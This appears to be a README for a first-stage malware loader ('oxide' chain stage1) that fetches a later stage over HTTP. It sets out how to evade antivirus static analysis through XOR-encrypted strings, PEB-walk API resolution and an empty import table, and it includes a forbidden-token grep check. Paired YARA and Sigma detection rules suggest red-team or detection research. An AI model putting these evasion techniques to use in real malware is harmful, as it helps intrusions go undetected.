# stage1

First-stage HTTP fetcher for the oxide loader chain. Windows PE and
Linux ELF. The Windows build is the surface that matters for static-
analysis scoring — the Linux build is for development iteration.

---

## Static Cleanliness

The Windows build targets a binary that reveals no offensive intent
under `strings`, `objdump -p`, or standard VirusTotal static signals.

### Two hardenings

**1. Compile-time XOR string encryption.**
Every offensive literal (User-Agent, URL scheme + path, host default,
loaded DLL name) is written as a per-character XOR expression:

```c
static volatile const unsigned char k_ua_enc[] = {
    XE('M',0), XE('o',1), XE('z',2), ...
};
```

Each `XE(c, i)` is a constant expression that GCC folds at compile
time into a single encrypted byte (`c ^ (0x5A + i)`). The `.rodata`
section contains only the encrypted bytes; the plaintext is never
emitted to the binary.

At runtime, `xs_decode()` — marked `noinline` and reading from a
`volatile` buffer so the optimizer can't rematerialize the plaintext —
unscrambles the blob into a stack-local buffer. `xs_wipe()` zeros the
stack buffer before the scope exits.

Implementation: `src/xor_string.h`, `src/xor_string.c`.
Unit test: `tests/test_xs.c` (roundtrip + no-plaintext-in-enc check).

**2. PEB walk API resolution.**
No Windows API is linked through the IAT. `resolve_apis()` at entry
reads `gs:[0x60]` → `PEB.Ldr` → `InMemoryOrderModuleList`, matches
loaded modules by case-insensitive djb2 of the UTF-16 `BaseDllName`,
then walks each target module's export directory and matches exports
by case-insensitive djb2 of the ASCII name string. The result is a
function-pointer table (`g_api`) that every Windows call in the loader
routes through.

- kernel32.dll is found in the Ldr list (loaded as a known DLL by the
  Windows loader regardless of imports) and supplies `LoadLibraryA`
  and `ExitProcess`.
- kernelbase.dll (kernel32 dependency) supplies `VirtualAlloc`,
  `VirtualFree`, `Sleep` — kernel32's exports forward to kernelbase on
  Win10/11, so we resolve them directly.
- wininet.dll is loaded on demand via the bootstrapped `LoadLibraryA`;
  its name is the one string `resolve_apis` needs and it lives in an
  `XE()`-encrypted blob.

Implementation: `src/peb_walk.c`, `src/api_table.c`, `src/hash.h`.
Unit test: `tests/test_hash.c` (locks in djb2 constants).

### Target IAT

Goal: one import or zero. Current build: **zero imports** — the linker
does not emit any IAT entries because nothing in our code references
a Windows function by name at link time.

```
$ x86_64-w64-mingw32-objdump -p build/stage1.exe | grep -A 5 "The Import"
The Import Tables (interpreted .idata section contents)
 vma:            Hint    Time      Forward  DLL       First
                 Table   Stamp     Chain    Name      Thunk
 00004000       00000000 00000000 00000000 00000000 00000000
```

(The zero row is the import-table terminator — there are no entries.)

This is enabled by freestanding build flags in `Makefile`:
`-nostdlib -nodefaultlibs -nostartfiles -ffreestanding
-Wl,--entry=stage1_entry`, plus `-fno-builtin-memcpy -fno-builtin-memset`
to block the compiler from emitting implicit `memcpy`/`memset` calls
on aggregate copies.

### Verify cleanliness

Baseline commands, runnable against any build of `stage1.exe`:

```bash
# 1. No forbidden tokens in the strings dump
strings build/stage1.exe | grep -iE \
  "oxide|beacon|stage|implant|c2|http://|https://|User-Agent|Mozilla|VirtualAlloc|LoadLibrary|GetProcAddress|wininet|InternetOpen|/api/"
# -> must print nothing

# 2. IAT must be empty or ExitProcess only
x86_64-w64-mingw32-objdump -p build/stage1.exe | awk '/DLL Name:/ {print}'
# -> must print nothing, or a single "DLL Name: kernel32.dll" line

# 3. Binary under 20 KB
stat -c %s build/stage1.exe
# -> must be <= 20480

# 4. Paired detection rule fires on our build
yara ../detection/yara/stage1_peb_walk.yar build/stage1.exe
# -> must print: Oxide_Stage1_PEB_Walk_x64 build/stage1.exe

# All in one shot:
make verify
```

### Unit tests

```bash
cd tests && make run
```

Builds and runs `test_hash` (djb2 constants) and `test_xs` (XS macro
roundtrip + anti-fold check) on the Linux host. Failure means the
hash contract or the string obfuscation is broken; the Windows build
should not be trusted until both pass.

---

## Build

```bash
make linux     # development iteration
make windows   # real deliverable (requires mingw-w64)
make verify    # static-cleanliness gate
make check     # size constraint
```

The Linux build keeps the plaintext User-Agent + URL pattern for
development convenience (the 0/72 goal applies to the Windows PE). The
Windows build is freestanding; no CRT, no default libraries.

## Detection pairing

Every stage1 technique ships with detections in `../detection/`:

| Technique          | YARA                              | Sigma                                    |
|--------------------|-----------------------------------|------------------------------------------|
| PEB walk + min IAT | `stage1_peb_walk.yar` (T1027.007) | `stage1_minimal_iat.yml` (T1027.007)     |
| Staging URL fetch  | `stage1_imports.yar` (legacy)     | `stage1_network.yml` (T1071.001, T1105)  |
| XOR loop magic     | `stage1_xor.yar`, `stage1_magic.yar` | —                                     |
